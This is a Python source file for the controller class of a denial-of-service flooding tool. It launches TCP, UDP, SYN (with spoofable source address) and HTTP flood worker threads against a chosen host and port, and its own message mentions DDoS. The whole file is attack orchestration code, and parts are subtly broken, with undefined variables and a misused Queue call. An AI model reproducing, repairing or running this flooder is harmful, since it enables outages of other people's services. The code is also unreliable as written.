from multiprocessing import Queue
from Events import *
from main import *
from UDPWorkerThread import *
from TCPWorkerThread import *
from SYNWorkerThread import *
from HTTPWorkerThread import *
import synmod

class Flooder:

    def __init__(self, host, port, timeout, method, threads, subsite, message, Random, wait, srchost, srcport):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.method = method
        self.threadsAmount = threads
        self.__processes = []
        self.wait = wait
        self.speed = speed
        self.subsite = subsite
        self.message = message
        self.random = random
        self.threadId = 0
        self.byteCount = Queue.Queue()
        self.srchost = srchost
        self.srcport = srcport
        self.initsuccess = True

        if host == "127.0.0.1" or host == "localhost":
            print "Is someone being funny again? I'm not going to DDoS myself"


        try:
            if method.index(TCP_METHOD) != -1:
                if message == None and random == False:
                    print "Message missing, not using TCP method"
                    method.remove(TCP_METHOD)
        except:
            pass

        try:
            if method.index(UDP_METHOD) != -1:
                if message == None and random == False:
                    print "Message missing, not using UDP method"
                    method.remove(UDP_METHOD)
        except:
            pass

        try:
            if method.index(SYN_METHOD) != -1:
                ret = synmod.init(srchost, srcport, host, port)
                if ret != -1:
                    print "synmod init success"
                else:
                    method.remove(SYN_METHOD)
        except:
            pass


        if len(method) == 0:
            print "No methods left to try, not starting."
            self.initsuccess = False
            

    def start(self):
        if len(self.__processes) > 0 or not self.initsuccess:
            return

        for x in range(self.threadsAmount):
            p = None
            if self.method[x%len(self.method)] == TCP_METHOD:
	            p = TCPWorkerThread(self, self.threadId)
            elif self.method[x%len(self.method)] == UDP_METHOD:
	            p = UDPWorkerThread(self, self.threadId)
            elif self.method[x%len(self.method)] == SYN_METHOD:
	            p = SYNWorkerThread(self, self.threadId)
            elif self.method[x%len(self.method)] == HTTP_METHOD:
	            p = HTTPWorkerThread(self, self.threadId)
            self.threadId += 1
            self.__processes.append(p)
            p.start()

    def stop(self):
        while len(self.__processes) > 0:
            p = self.__processes.pop()
            p.stop()
            p.terminate() #This will leave some defunct threads, but they will be reaped upon starting automatically.

        byteCount = 0
        #print "len:", self.byteCount.qsize()
        while 1:
            try:
                b = self.byteCount.get(True, 2)
                byteCount += b
                #print "b:", b
            except:
                #print "failed to get"
                break

        print "final byteCount:", byteCount

